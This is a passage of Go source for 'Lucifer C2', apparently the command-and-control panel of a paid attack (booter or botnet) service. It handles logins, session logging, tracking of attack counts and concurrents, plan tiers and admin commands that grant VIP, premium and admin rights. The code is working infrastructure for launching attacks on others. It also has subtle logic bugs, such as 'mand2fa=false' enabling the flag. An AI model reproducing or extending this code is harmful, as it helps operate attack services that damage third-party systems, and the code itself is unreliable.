	fmt.Fprint(this.conn, "\033c")
	this.conn.Write([]byte("[12;36H\033[0mHello....\033[0m\r\n"))
	this.conn.Write([]byte("\033[36;0H\033[107;30;140mWelcome To Lucifer C2                                               v1.81.1.7427\033[0m\033[0m[?25l"))
	time.Sleep(150 * time.Millisecond)
	time.Sleep(time.Duration(250) * time.Millisecond)
	this.conn.Write([]byte("\033[8;24;80t"))
	if _, err := termfxV2("lol.tfx", &userInfo, this.conn, false, false); err != nil {
	this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
	fmt.Println(err)
        return
	}

	var session = &Session{
	ID:       time.Now().UnixNano(),
	Username: username,
	Conn:     this.conn,

	Created:     time.Now(),
	LastCommand: time.Now(),
	}

	sessionMutex.Lock()
	sessions[session.ID] = session
	sessionMutex.Unlock()

	defer session.Remove()

	this.commands(userInfo, username, password, session, Testing)
}
func (this *Admin) commands(userInfo AccountInfo, username string, password string, session *Session, term *Terminal) {
	go func() {
		i := 0
		Frames := []string{
			"L", "Lu", "Luc", "Luci", "Lucif", "Lucife", "Lucifer", "Lucifer-", "Lucifer-9", "Lucifer-99", "Lucifer-999", "Lucifer-99", "Lucifer-9", "Lucifer-", "Lucifer", "Lucife", "Lucif", "Luci", "Luc", "Lu", "L",
		}
		for {
			for f := 0; f < len(Frames); f++ {
				Uptime := GetUptime()
				time.Sleep(time.Duration(700) * time.Millisecond)
				titlejson, err := ioutil.ReadFile("json/title.json")
				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
				}
				stringjsonfile := string(titlejson)
				var session = (gjson.Get(stringjsonfile, "SessionsName")).String()
				var expiry = (gjson.Get(stringjsonfile, "expiry")).String()
				var attackslol = (gjson.Get(stringjsonfile, "totalattacks")).String()
				var c2uptime = (gjson.Get(stringjsonfile, "c2uptime")).String()
				ongoing := database.ListOngoing()
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; "+session+"[%d] + "+attackslol+"[%d] + "+expiry+"[%s] + "+c2uptime+"%.0f min(s) + [ "+Frames[f]+" ]\007", len(sessions), int(ongoing), fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(userInfo.expiry, 0))).Hours()/24), Uptime))); err != nil {
					this.conn.Close()
					break
				}
				i++
				if i%60 == 0 {
					this.conn.SetDeadline(time.Now().Add(120 * time.Second))
				}
			}
		}
	}()
	f, err := os.OpenFile("./logs/logins.txt", os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println(err)
		return
	}

	clog := time.Now()
	ip, _, err := net.SplitHostPort(fmt.Sprint(this.conn.RemoteAddr()))
	if err != nil {
		ip = fmt.Sprint(this.conn.RemoteAddr())
	}
	newLine := "[LOGIN] -> [Username: " + username + "] -> [IP: " + ip + "] -> [Date and Time: " + clog.Format("Jan 02 2006") + " " + clog.Format("15:04:05") + "]"
	_, err = fmt.Fprintln(f, newLine)
	if err != nil {
		fmt.Println(err)
		f.Close()
		return
	}
	err = f.Close()
	if err != nil {
		fmt.Println(err) 
		return
	}
	this.conn.Write([]byte("\033[8;24;80t"))
	if _, err := termfxV2("banner.tfx", &userInfo, this.conn, false, false); err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
		fmt.Println(err)
		f.Close()
		return
	}

	for {
		this.conn.SetDeadline(time.Now().Add(1800 * time.Second))
		if userInfo.premium == true {
			session.premium = true
		} else {
			session.premium = false
		}
		if userInfo.seller == true {
			session.seller = true
		} else {
			session.seller = false
		}
		if userInfo.admin == true {
			goto skiplock
		}
		if lock == 1 {
			this.conn.Write([]byte(fmt.Sprintf("\033[0mTemperarely kicking all sessions\033[0m\r\n")))
			time.Sleep(time.Duration(10000) * time.Millisecond)
			return
		}
	skiplock:
		jsonprompt, err := ioutil.ReadFile("json/prompt.json")
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
		}
		stringjsonfile := string(jsonprompt)
		var jsonprompt2 = (gjson.Get(stringjsonfile, "prompt")).String()
		jsonprompt3 := strings.Replace(jsonprompt2, "<<$username>>", userInfo.username, -1)
		cmd, err := term.readLine(jsonprompt3, 1024, false, "", true)
		if err != nil {
			return
		}
		var history = &history{
			ID:       time.Now().UnixNano(),
			Username: username,
			Password: password,
			Admin:    userInfo.admin,
			Conn:     this.conn,
			Cmdhis:   cmd,
		}
		historyMutex.Lock()
		cmds[history.ID] = history
		historyMutex.Unlock()
		sessionMutex.Lock()
		username5 := username
		recent := cmd
		for _, s := range sessions {
			if s.Listen == true {
				fmt.Fprintf(s.Conn, "\033[0m\r\n\033[92m%s \033[0m| \033[1;32mcmd\033[0m: %s\033[0m\r\n", username5, recent)
				this.conn.Write([]byte("\033[0m"))
				continue
			}
			continue
		}
		sessionMutex.Unlock()
		if cmd == "exit" || cmd == "quit" || cmd == "LOGOUT" || cmd == "logout" {
			this.conn.Write([]byte("\033[4;31mEnding Your Session.\033[0;0m\033[25l"))
			time.Sleep(3000 * time.Millisecond)
			return
		}

		session.LastCommand = time.Now()

		if cmd == "" {
			this.conn.Write([]byte("\033[8;24;80t"))
			this.conn.Write([]byte("\033[0;0mNo Command Entered.\033[0;0m\r\n"))
			continue
		}

		if len(cmd) > 500 {
			this.conn.Write([]byte("\033[0m\033[31mKilling session For. |Buffer Overflow|\033[0m\r\n"))
			time.Sleep(3000 * time.Millisecond)
			return
		}

		f, err := os.OpenFile("./logs/commandlogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println(err)
			return
		}

		clog := time.Now()
		newLine := clog.Format("Jan 02 2006") + " " + clog.Format("15:04:05") + " | " + username + " | " + cmd
		_, err = fmt.Fprintln(f, newLine)
		fmt.Printf("\033[104;30;140m %s \033[0;0m typed: \033[97m%s\033[0m\r\n\033[0m-> \033[0m", username, cmd)
		if err != nil {
			fmt.Println(err)
			f.Close()
			return
		}
		err = f.Close()
		if err != nil {
			fmt.Println(err)
			return
		}

		if cmd == "mand2fa=true" {

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			mand2fa = true
			this.conn.Write([]byte("\033[0mYou Have Activated Manditory2fa!\r\n"))
			continue
		}

		if cmd == "mand2fa=false" {

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			mand2fa = true
			this.conn.Write([]byte("\033[0mYou Have Deactivated Manditory2fa!\r\n"))
			continue
		}

		if cmd == "listen-on" {

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			session.Listen = true
			this.conn.Write([]byte("\033[0mYou Have Toggled session.Listen!\r\n"))
			continue
		}

		if cmd == "listen-off" {

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			session.Listen = false
			this.conn.Write([]byte("\033[0mToggled session.Listen = false!\r\n"))
			continue
		}

		if cmd == "clearterm" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			clearTerm = true
			if clearTerm == true {
				fmt.Printf("\033c")
			}
			clearTerm = false
			err := CompleteLoad()
			err = CompleteLoad2()
			err = CompleteLoad3()
			err, count := LoadBranding("branding")
			if err != nil {
				fmt.Printf("\033[0m[\033[101;30;140m FATAL \033[0;0m] failed to load file %s\r\n\033[0m-> \033[0m", err)
				continue
			}
			fmt.Printf("\033[0m[\033[102;30;140m OK \033[0;0m] loaded `branding`, `json`, `loader`\r\n\033[0m")
			fmt.Printf("\033[0m[\033[102;30;140m OK \033[0;0m] total branding files: " + strconv.Itoa(count) + "\r\n\033[0m")
			this.conn.Write([]byte("\033[0mterminal cleared\r\n"))
			continue
		}

		if cmd == "lock-off" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}
			lock = 0
			this.conn.Write([]byte(fmt.Sprintf("\033[0mToggled Lock to %d\r\n", lock)))
			continue
		}

		if cmd == "lock-on" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}
			lock = 1
			this.conn.Write([]byte(fmt.Sprintf("\033[0mToggled Lock to %d\r\n", lock)))
			continue
		}

		if cmd == "devil" || cmd == "DEVIL" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if str, err := termfx("./branding/lucifer.tfx", &userInfo, this.conn); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", str)))
				fmt.Println(err)
				f.Close()
				return
			}
			continue
		}

		if cmd == "hub" || cmd == "HUB" || cmd == "methods"  || cmd == "Methods"  || cmd == "METHODS"{
			this.conn.Write([]byte("\033[8;24;80t"))
			if str, err := termfx("./branding/hub.tfx", &userInfo, this.conn); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", str)))
				fmt.Println(err)
				f.Close()
				return
			}
			continue
		}

		if cmd == "testvv" || cmd == "Testvv" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if str, err := termfx("./branding/testvv.tfx", &userInfo, this.conn); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", str)))
				fmt.Println(err)
				f.Close()
				return
			}
			continue
		}

		if cmd == "night" || cmd == "Night" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if str, err := termfx("./branding/night.tfx", &userInfo, this.conn); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", str)))
				fmt.Println(err)
				f.Close()
				return
			}
			continue
		}

		if cmd == "kush" || cmd == "Kush" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if str, err := termfx("./branding/kush.tfx", &userInfo, this.conn); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", str)))
				fmt.Println(err)
				f.Close()
				return
			}
			continue
		}

		if userInfo.admin == true && cmd == "CHANGEMOTD" || userInfo.admin == true && cmd == "changemotd" {

			this.conn.Write([]byte("\033[0mNew MOTD:\033[0;97m "))
			msg, err := this.ReadLine(false, false)
			if err != nil {
				return
			}
			os.Remove("./branding/msg.tfx")
			f, err1 := os.Create("./branding/msg.tfx")
			if err1 != nil {
				f.Close()
				return
			}
			_, err2 := f.WriteString(msg)
			if err2 != nil {
				f.Close()
				return
			}
			this.conn.Write([]byte("\033[32mMSG Changed!\033[0m\r\n"))
			continue
		}

		if cmd == "cls" || cmd == "clear" || cmd == "c" || cmd == "C" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if _, err := termfxV2("banner.tfx", &userInfo, this.conn, false, false); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
				fmt.Println(err)
				f.Close()
				continue
			}
			continue
		}

		if cmd == "help" || cmd == "Help" || cmd == "HELp" || cmd == "HELP" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if _, err := termfxV2("help.tfx", &userInfo, this.conn, false, false); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
				fmt.Println(err)
				f.Close()
				continue
			}
			continue
		}

		if cmd == "Vision" || cmd == "vision" || cmd == "VISION" || cmd == "eye" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if _, err := termfxV2("vision.tfx", &userInfo, this.conn, false, false); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
				fmt.Println(err)
				f.Close()
				continue
			}
			continue
		}

		if cmd == "cursed" || cmd == "Cursed" || cmd == "CURSED" || cmd == "cr" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if _, err := termfxV2("contained.tfx", &userInfo, this.conn, false, false); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
				fmt.Println(err)
				f.Close()
				continue
			}
			continue
		}

		if cmd == "tos" || cmd == "Tos" || cmd == "TOs" || cmd == "TOS" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if _, err := termfxV2("tos.tfx", &userInfo, this.conn, false, false); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
				fmt.Println(err)
				f.Close()
				continue
			}
			continue
		}

		if cmd == "credits" || cmd == "CREDITS" || cmd == "Credits" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if _, err := termfxV2("credits.tfx", &userInfo, this.conn, false, false); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
				fmt.Println(err)
				f.Close()
				continue
			}
			continue
		}

		if cmd == "info" || cmd == "INFO" || cmd == "Info" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if _, err := termfxV2("info.tfx", &userInfo, this.conn, false, false); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
				fmt.Println(err)
				f.Close()
				continue
			}
			continue
		}

		if cmd == "tools" || cmd == "Tools" || cmd == "TOols" || cmd == "TOOLS" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if _, err := termfxV2("tools.tfx", &userInfo, this.conn, false, false); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
				fmt.Println(err)
				f.Close()
				continue
			}
			continue
		}

		if cmd == "admin" || cmd == "Admin" || cmd == "ADMin" || cmd == "ADMIN" {
			if userInfo.seller == true {
				goto skipadminauth
			}
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
		skipadminauth:
			this.conn.Write([]byte("\033[8;24;80t"))
			if _, err := termfxV2("admin.tfx", &userInfo, this.conn, false, false); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
				fmt.Println(err)
				f.Close()
				return
			}
			continue
		}

		if cmd == "stats" || cmd == "STATS" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if _, err := termfxV2("stats.tfx", &userInfo, this.conn, false, false); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
				fmt.Println(err)
				f.Close()
				continue
			}
			continue
		}

		if cmd == "motd" || cmd == "MOTD" {
			this.conn.Write([]byte("\033[8;24;80t"))
			if str, err := termfx("./branding/motd.tfx", &userInfo, this.conn); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", str)))
				fmt.Println(err)
				f.Close()
				return
			}
			continue
		}

		if cmd == "plan" || cmd == "PLAN" || cmd == "acc" || cmd == "ACC" {
			var unixTime int64 = userInfo.expiry
			var premium string
			var home string
			var vip string
			var accstat string
			t := time.Unix(unixTime, 0)
			Expdate := t.Format(time.UnixDate)
			if userInfo.premium == true {
				premium = "\033[92mtrue\033[0m"
			} else {
				premium = "\033[91mfalse\033[0m"
			}
			if userInfo.home == true {
				home = "\033[92mtrue\033[0m"
			} else {
				home = "\033[91mfalse\033[0m"
			}
			if userInfo.vip == true {
				vip = "\033[92mtrue\033[0m"
			} else {
				vip = "\033[91mfalse\033[0m"
			}
			if userInfo.expiry < 64 {
				accstat = "\033[97mMonthly\033[0m"
			} else {
				accstat = "\033[97mLifetime\033[0m"
			}
			this.conn.Write([]byte(fmt.Sprintf("\033[97mUsername:\033[0m [\033[97m%s\033[0m]\033[0m\r\n", string(username))))
			this.conn.Write([]byte(fmt.Sprintf("\033[97mHome-Plan:\033[0m [\033[97m%s\033[0m]\033[0m\r\n", string(home))))
			this.conn.Write([]byte(fmt.Sprintf("\033[97mVip-Plan:\033[0m [\033[97m%s\033[0m]\033[0m\r\n", string(vip))))
			this.conn.Write([]byte(fmt.Sprintf("\033[97mPremium:\033[0m [\033[97m%s\033[0m]\033[0m\r\n", string(premium))))
			this.conn.Write([]byte(fmt.Sprintf("\033[97mHometime:\033[0m [\033[97m%d\033[0m]-\033[97mSec\033[0m(\033[97ms\033[0m)\033[0m\r\n", userInfo.hometime)))
			this.conn.Write([]byte(fmt.Sprintf("\033[97mCooldown:\033[0m [\033[97m%d\033[0m]-\033[97mSec\033[0m(\033[97ms\033[0m)\033[0m\r\n", userInfo.cooldown)))
			this.conn.Write([]byte(fmt.Sprintf("\033[97mConcurrents:\033[0m [\033[97m%d\033[0m]\033[0m\r\n", userInfo.concurrents)))
			this.conn.Write([]byte(fmt.Sprintf("\033[97mTotal-Attacks:\033[0m [\033[97m%s\033[0m]\033[0m\r\n", strconv.Itoa(database.MySent(userInfo.username)))))
			this.conn.Write([]byte(fmt.Sprintf("\033[97mPlan-Status:\033[0m [\033[97m%s\033[0m]\033[0m\r\n", string(accstat))))
			this.conn.Write([]byte(fmt.Sprintf("\033[97mExpiration:\033[0m [\033[97m%s\033[0m]\033[0m\r\n", string(Expdate))))
			continue
		}

		if cmd == "reload" || cmd == "RELOAD" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}
			err := CompleteLoad()
			err = CompleteLoad2()
			err = CompleteLoad3()
			err, count := LoadBranding("branding")
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m[\033[101;30;140m FATAL \033[0;0m] failed to load file %s\r\n\033[0m-> \033[0m", err)))
				continue
			}
			this.conn.Write([]byte(fmt.Sprintf("\033[0m[\033[102;30;140m OK \033[0;0m] loaded `branding`, `json`, `loader`\r\n\033[0m")))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m[\033[102;30;140m OK \033[0;0m] total branding files: " + strconv.Itoa(count) + "\r\n\033[0m")))
			continue
		}

		if cmd == "logs" || cmd == "LOGS" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}
			this.conn.Write([]byte("\033[8;24;80t"))
			if _, err := termfxV2("banner.tfx", &userInfo, this.conn, false, false); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
				fmt.Println(err)
				f.Close()
				continue
			}
			continue
		}

		if cmd == "cmdlogs" || cmd == "CMDLOGS" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}
			fmt.Fprint(this.conn, "\033c")
			file, err := os.Open("logs/commandlogs.txt")

			if err != nil {
				log.Fatalf("failed to open")

			}
			scanner := bufio.NewScanner(file)
			scanner.Split(bufio.ScanLines)
			var text []string

			for scanner.Scan() {
				text = append(text, scanner.Text())
			}
			file.Close()

			for _, each_ln := range text {
				this.conn.Write([]byte(each_ln + "\r\n"))
			}
			continue
		}

		if cmd == "logins" || cmd == "LOGINS" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}
			fmt.Fprint(this.conn, "\033c")
			file, err := os.Open("logs/logins.txt")

			if err != nil {
				log.Fatalf("failed to open")
			}
			scanner := bufio.NewScanner(file)
			scanner.Split(bufio.ScanLines)
			var text []string

			for scanner.Scan() {
				text = append(text, scanner.Text())
			}
			file.Close()

			for _, each_ln := range text {
				this.conn.Write([]byte(each_ln + "\r\n"))
			}
			continue
		}

		if cmd == "failedlogins" || cmd == "FAILEDLOGINS" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}
			fmt.Fprint(this.conn, "\033c")
			file, err := os.Open("logs/failedlogins.txt")

			if err != nil {
				log.Fatalf("failed to open")

			}
			scanner := bufio.NewScanner(file)
			scanner.Split(bufio.ScanLines)
			var text []string

			for scanner.Scan() {
				text = append(text, scanner.Text())
			}
			file.Close()

			for _, each_ln := range text {
				this.conn.Write([]byte(each_ln + "\r\n"))
			}
			continue
		}

		if cmd == "acclogs" || cmd == "ACCLOGS" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}
			fmt.Fprint(this.conn, "\033c")
			file, err := os.Open("logs/acclogs.txt")

			if err != nil {
				log.Fatalf("failed to open")

			}
			scanner := bufio.NewScanner(file)
			scanner.Split(bufio.ScanLines)
			var text []string

			for scanner.Scan() {
				text = append(text, scanner.Text())
			}
			file.Close()

			for _, each_ln := range text {
				this.conn.Write([]byte(each_ln + "\r\n"))
			}
			continue
		}

		if cmd == "apilogs" || cmd == "APILOGS" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}
			fmt.Fprint(this.conn, "\033c")
			file, err := os.Open("logs/apilogs.txt")

			if err != nil {
				log.Fatalf("failed to open")

			}
			scanner := bufio.NewScanner(file)
			scanner.Split(bufio.ScanLines)
			var text []string

			for scanner.Scan() {
				text = append(text, scanner.Text())
			}
			file.Close()

			for _, each_ln := range text {
				this.conn.Write([]byte(each_ln + "\r\n"))
			}
			continue
		}

		args := strings.Split(cmd, " ")
		switch strings.ToLower(args[0]) {
		case "passwd":

			fmt.Fprint(this.conn, "\033[96mCurrent Password\033[0m: ")
			currentPassword, err := this.ReadLine(true, true)
			if err != nil {
				return
			}

			if currentPassword != password {
				fmt.Fprintln(this.conn, "\033[91mIncorrect Password!\r")
				continue
			}

			fmt.Fprint(this.conn, "\033[96mNew Password\033[0m: ")
			newPassword, err := this.ReadLine(true, true)
			if err != nil {
				return
			}

			fmt.Fprint(this.conn, "\033[96mConfirm Password\033[0m: ")
			confirmPassword, err := this.ReadLine(true, true)
			if err != nil {
				return
			}

			if len(newPassword) < 6 {
				fmt.Fprintln(this.conn, "\033[91mYour Password Is Not Secure!\033[0m\r")
				continue
			}

			if confirmPassword != newPassword {
				fmt.Fprintln(this.conn, "\033[91mYour Passwords Do Not Match!\033[0m\r")
				continue
			}

			if database.ChangeUsersPassword(username, newPassword) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Chnaged Password!\033[0m\r")
				continue
			}

			fmt.Fprintln(this.conn, "\033[00;92mYour Password Has Changed!\033[0m\r")
			password = newPassword
			continue

		case "cmdlogs":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			file, err := os.Open("logs/commandlogs.txt")

			if err != nil {
				log.Fatalf("failed to open")

			}
			scanner := bufio.NewScanner(file)
			scanner.Split(bufio.ScanLines)
			var text []string

			for scanner.Scan() {
				text = append(text, scanner.Text())
			}
			file.Close()

			for _, each_ln := range text {
				this.conn.Write([]byte(each_ln + "\r\n"))
			}
			continue

		case "apilogs":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			file, err := os.Open("logs/apilogs.txt")

			if err != nil {
				log.Fatalf("failed to open")

			}
			scanner := bufio.NewScanner(file)
			scanner.Split(bufio.ScanLines)
			var text []string

			for scanner.Scan() {
				text = append(text, scanner.Text())
			}
			file.Close()

			for _, each_ln := range text {
				this.conn.Write([]byte(each_ln + "\r\n"))
			}
			continue

		case "acclogs":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			file, err := os.Open("logs/acclogs.txt")

			if err != nil {
				log.Fatalf("failed to open")

			}
			scanner := bufio.NewScanner(file)
			scanner.Split(bufio.ScanLines)
			var text []string

			for scanner.Scan() {
				text = append(text, scanner.Text())
			}
			file.Close()

			for _, each_ln := range text {
				this.conn.Write([]byte(each_ln + "\r\n"))
			}
			continue

		case "vip=true":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: vip=true (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			if database.MakeVip(user.username) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Add VIP!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Added Vip To Users: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mVIP Has Been Added!\033[00;0m\r")
			continue

		case "vip=false":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: vip=false (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			if database.RemoveVip(userInfo.username) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Remove VIP!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Removed Vip For User: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mVIP Has Been Removed From "+user.username+"!\033[00;0m\r")
			continue

		case "admin=false":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: admin=false (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			if database.RemoveAdmin(user.username) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Remove ADMIN!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Removed Admin For User: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mADMIN Has Been Removed From "+user.username+"!\033[00;0m\r")
			continue

		case "admin=true":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: admin=true (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			if database.MakeAdmin(user.username) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Add Admin!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Added Admin To Users: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mAdmin Has Been Added!\033[00;0m\r")
			continue

		case "premium=false":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: premium=false (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			if database.RemovePremium(user.username) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Remove Premium!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Removed Premium For User: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mPremium Has Been Removed From "+user.username+"!\033[00;0m\r")
			continue

		case "premium=true":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: premium=true (username)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			if database.MakePremium(user.username) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Add Premium!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

